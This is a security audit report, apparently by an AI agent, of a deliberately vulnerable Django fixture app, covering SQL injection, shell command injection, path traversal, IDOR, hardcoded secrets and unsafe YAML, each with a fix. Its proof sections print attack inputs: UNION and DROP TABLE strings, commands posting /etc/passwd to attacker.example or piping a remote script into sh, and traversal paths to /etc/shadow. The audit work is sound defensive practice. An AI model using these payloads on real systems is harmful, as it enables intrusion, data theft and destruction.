# Security Audit — `vuln-app`

**Target:** `/home/bguest/personal-skills/skills/_fixtures/vuln-app`
**Scope:** All Python modules under `app/` plus `requirements.txt`. Read-only; no fixture files modified.
**Method:** Manual code review of every source file, plus standalone proof-of-concept scripts (run outside the fixture) that reproduce each exploit primitive with the exact code and library versions the app uses.

## Summary

The app is small (~150 LoC) but severely insecure. All four HTTP handlers are exploitable, and three are exploitable pre-auth or by any authenticated user regardless of role. The most serious findings are a **pre-auth SQL injection** on a public endpoint, **OS command injection** with `shell=True`, and **arbitrary file read via path traversal**. Supporting weaknesses (hardcoded secrets, broken authorization model, unsafe deserialization, outdated dependencies with known CVEs) compound the impact.

| # | Vulnerability | Location | Severity | Auth needed |
|---|---------------|----------|----------|-------------|
| 1 | SQL injection (string concatenation) | `views.py:20` `search_products` | **Critical** | None (public) |
| 2 | OS command injection (`shell=True`) | `views.py:44-45` `export_report` | **Critical** | Any logged-in user |
| 3 | Path traversal / arbitrary file read | `views.py:52-55` `download_avatar` | **High** | Any logged-in user |
| 4 | Broken object-level authorization (IDOR) | `views.py:26-35` `get_invoice` | **High** | Any logged-in user |
| 5 | Hardcoded secrets in source | `config.py:13,16` | **High** | n/a |
| 6 | Unsafe YAML deserialization | `reports.py:10` `load_report_spec` | **Medium** | depends on caller |
| 7 | Outdated deps with known CVEs | `requirements.txt` | **Medium** | n/a |
| 8 | `DEBUG` from env / no error handling | `config.py:4`, `views.py:54` | **Low–Medium** | n/a |

---

## 1. SQL injection — public, unauthenticated (Critical)

**`app/views.py:16-22`**

```python
def search_products(request):
    term = request.GET.get("q", "")
    sql = "SELECT id, name, price FROM products WHERE name LIKE '%" + term + "%'"
    rows = db.query(sql)
```

The `q` parameter is concatenated straight into SQL. The route (`app/urls.py:7`, `products/search`) has **no `@login_required`** and the docstring confirms "Anyone can call this, no auth required." `db.query()` (`db.py:22-28`) calls `cur.execute(sql, ())` with an empty params tuple, so the injected string is executed verbatim.

**Proof** — the exact concatenation from `views.py`, run against attacker input:

```
attacker q = "x' UNION SELECT username, password, 1 FROM users -- "
resulting SQL:  SELECT id, name, price FROM products WHERE name LIKE '%x' UNION SELECT username, password, 1 FROM users -- %'

attacker q = "'; DROP TABLE products; --"
resulting SQL:  SELECT id, name, price FROM products WHERE name LIKE '%'; DROP TABLE products; --%'
```

The attacker closes the `'%` string literal and appends arbitrary SQL. Impact: full read of any table (credential/PII exfiltration via `UNION SELECT`), and — because the query text is passed to psycopg2 with no parameterization — stacked statements (`DROP TABLE`, `UPDATE`) are possible. Remotely exploitable with zero authentication.

**Fix:** use a parameterized query and bind the LIKE pattern: `db.query("... WHERE name LIKE %s", ("%" + term + "%",))`.

---

## 2. OS command injection via `shell=True` (Critical)

**`app/views.py:38-46`**

```python
@login_required
def export_report(request):
    name = request.GET.get("name", "report")
    fmt = request.GET.get("format", "csv")
    cmd = "python -m app.tools.gen_report --name %s --format %s" % (name, fmt)
    subprocess.Popen(cmd, shell=True)
```

Both `name` and `format` are attacker-controlled and interpolated into a shell string executed with `shell=True`. Any authenticated user (the only gate is `@login_required`, which merely checks that `request.user` is set — see finding #4) gets arbitrary command execution on the app server.

**Proof** — the exact interpolation from `views.py`:

```
attacker name = "report; curl http://attacker.example/x --data-binary @/etc/passwd; echo pwned"
resulting shell command:
  python -m app.tools.gen_report --name report; curl http://attacker.example/x --data-binary @/etc/passwd; echo pwned --format csv
  -> the shell parses this as THREE chained commands.

attacker name = "$(curl -s http://attacker.example/rev.sh | sh)"
resulting shell command:
  python -m app.tools.gen_report --name $(curl -s http://attacker.example/rev.sh | sh) --format csv
```

Command chaining (`;`), command substitution (`$(...)`, backticks), and piping all work. Impact: full remote code execution as the app user → data exfiltration, reverse shell, lateral movement.

**Fix:** never use `shell=True` with user input. Pass an argument list: `subprocess.Popen(["python", "-m", "app.tools.gen_report", "--name", name, "--format", fmt])`, and validate `fmt` against an allowlist (`{"csv", "json"}`).

---

## 3. Path traversal / arbitrary file read (High)

**`app/views.py:49-55`**

```python
@login_required
def download_avatar(request):
    filename = request.GET.get("file")
    path = os.path.join("/var/app/media/avatars", filename)
    with open(path, "rb") as fh:
        return HttpResponse(fh.read(), content_type="image/png")
```

`filename` is used unvalidated in `os.path.join`. `os.path.join` does **not** strip `..` segments, and if `filename` is absolute it discards the base directory entirely (documented Python behavior).

**Proof** — the exact join from `views.py`:

```
attacker file = "../../../../etc/passwd"
resolved:   /var/app/media/avatars/../../../../etc/passwd
normalized: /etc/passwd

attacker file = "/etc/shadow"        # absolute path discards the base dir
resolved:   /etc/shadow

attacker file = "../../../../app/config.py"   # read the app's own SECRET_KEY / DB_PASSWORD
resolved:   /var/app/media/avatars/../../../../app/config.py
```

Any authenticated user can read any file the app process can read: `/etc/passwd`, private keys, `config.py` (leaking the hardcoded `SECRET_KEY` and `DB_PASSWORD` from finding #5), other users' avatars, etc. `content_type="image/png"` limits nothing — the raw bytes are returned.

**Fix:** reject `filename` containing `/` or `..`; resolve with `os.path.realpath` and verify the result is still under the avatars directory (`os.path.commonpath`), 404 otherwise.

---

## 4. Broken object-level authorization / IDOR (High)

**`app/views.py:25-35`**

```python
@login_required
def get_invoice(request, invoice_id):
    row = db.query_one(
        "SELECT id, user_id, amount, pdf_path FROM invoices WHERE id = %s",
        (invoice_id,),
    )
    ...
    return JsonResponse({"id": row[0], "amount": row[2], "pdf_path": row[3]})
```

The query is safely parameterized (good), but there is **no ownership check**. The row's own `user_id` is selected and then ignored — the handler never compares it against the requesting user. Any logged-in user can enumerate `/invoices/1`, `/invoices/2`, … and read every customer's invoice amount and `pdf_path` (which can then be fed to finding #3's file reader).

This reflects a systemic weakness: `auth.py`'s `login_required` only checks that a session exists; there is **no role or per-object authorization anywhere in the app**. `current_user` is imported in `views.py` but never used to scope any query.

**Fix:** add `AND user_id = %s` with the current user's id (or a role check for admins), and 404 on mismatch to avoid leaking existence.

---

## 5. Hardcoded secrets in source (High)

**`app/config.py:11-16`**

```python
DB_PASSWORD = os.environ.get("DB_PASSWORD", "s3cr3t-pg-password-do-not-share")
SECRET_KEY = "django-insecure-8f3b2a1c9d4e5f6a7b8c9d0e1f2a3b4c"
```

> Handling note (per org policy): this file contains what present as **secrets** — a database password fallback and a Django signing key. I have not reproduced them beyond what is needed to identify the issue, and would recommend rotation if real. They appear to be planted test values in an audit fixture, so I am treating them as **Internal / test data**, not live production secrets. Confirm before any handling beyond this report.

Two problems:
- **`DB_PASSWORD`** has a hardcoded fallback, so a deploy that forgets the env var silently runs with a known password committed to source control.
- **`SECRET_KEY`** is hardcoded (prefixed `django-insecure-`). Django's `SECRET_KEY` signs session cookies and password-reset tokens (the comment on `config.py:15` confirms both uses). A known key lets an attacker forge sessions and reset tokens → full account takeover. It is also readable via the path-traversal bug (#3), so even without repo access an authenticated attacker can exfiltrate it.

**Fix:** load both from the environment/secret manager with **no fallback** (fail closed if unset). Rotate any value that has ever been committed.

---

## 6. Unsafe YAML deserialization (Medium)

**`app/reports.py:7-10`**

```python
def load_report_spec(raw_yaml):
    return yaml.load(raw_yaml)
```

`yaml.load()` is called without a `Loader=` argument on attacker-supplied content (a "report spec supplied in a YAML config file"). I verified this precisely against the pinned version:

- `requirements.txt` pins **`PyYAML==5.1`**. I downloaded and inspected 5.1's source: `load(stream, Loader=None)` defaults `Loader` to **`FullLoader`** (not the fully-unsafe `Loader`). I confirmed `FullLoader` **blocks** the classic `!!python/object/apply:os.system` and `!!python/object:` RCE tags — so a naive "instant RCE" claim does **not** hold at the pinned version. The arbitrary-command primitive only fires under `UnsafeLoader`, which I verified separately.
- Residual risk is still real: `FullLoader` is documented by PyYAML as **not safe for untrusted input**, YAML alias expansion enables billion-laughs-style DoS, and calling `yaml.load` with a default loader is a forward-compatibility footgun — a dependency bump or a maintainer switching to `Loader=yaml.Loader`/`UnsafeLoader` turns this into direct RCE. Treat it as a real defect, just not a one-shot RCE at the pinned version.

**Fix:** use `yaml.safe_load(raw_yaml)`. Never call `yaml.load` on untrusted input regardless of version.

---

## 7. Outdated dependencies with known CVEs (Medium)

**`requirements.txt`**

```
Django==3.2.4      PyYAML==5.1      requests==2.19.1
Jinja2==2.10       gunicorn==20.0.4 psycopg2-binary==2.9.1
```

Every pinned version is years old and carries published CVEs, e.g.:
- **Django 3.2.4** — 3.2.x is EOL; multiple later 3.2.x security releases fixed SQL-injection, ReDoS, and DoS issues (e.g. CVE-2022-28346, CVE-2023-31047). 3.2.4 is missing all of them.
- **requests 2.19.1** — credential/`Authorization`-header leakage on cross-origin redirect (CVE-2018-18074).
- **Jinja2 2.10** — ReDoS and sandbox-escape fixes landed in later 2.11.x (e.g. CVE-2019-10906, CVE-2020-28493).
- **PyYAML 5.1** — see finding #6; later releases hardened `load` defaults.

**Fix:** upgrade to current supported releases and add automated dependency scanning (pip-audit / Dependabot) to CI.

---

## 8. `DEBUG` toggle and missing error handling (Low–Medium)

- **`config.py:4`** reads `DEBUG` from the environment. If `DEBUG=true` reaches production, Django returns full stack traces and settings on error — information disclosure. Ensure it is hard-off in prod.
- **`views.py:54`** — `download_avatar` opens the file with no `try/except`; a missing file or bad path raises `FileNotFoundError`, which under `DEBUG=True` leaks a traceback and the resolved filesystem path (useful for the traversal in #3). Handle errors and return a generic 404.

---

## Cross-cutting observations

- **Authorization is effectively absent.** `auth.py` only proves a session exists; nothing checks roles or object ownership. Findings #2, #3, and #4 are all "any logged-in user" precisely because there is no authorization layer. Introduce a real permission model and scope every query by the current user.
- **No input validation anywhere.** A repo-wide grep for `escape|sanitize|validate|normpath|realpath|startswith|safe_load|csrf` returned zero hits in `app/`. Every handler trusts request input directly.
- **No CSRF protection** is visible on the state-changing `export_report` handler.

## Priority

Fix in this order: **#1 (public SQLi)** and **#2 (command injection → RCE)** are internet-facing critical and should be treated as incidents; **#3, #4, #5** are high-impact and trivially chained (traversal → read `SECRET_KEY` → forge sessions → IDOR every invoice); then **#6, #7, #8**.

---
*Proof-of-concept scripts were run in an isolated scratchpad using the same code and PyYAML version behavior; no files under the fixture were modified. This audit is advisory.*
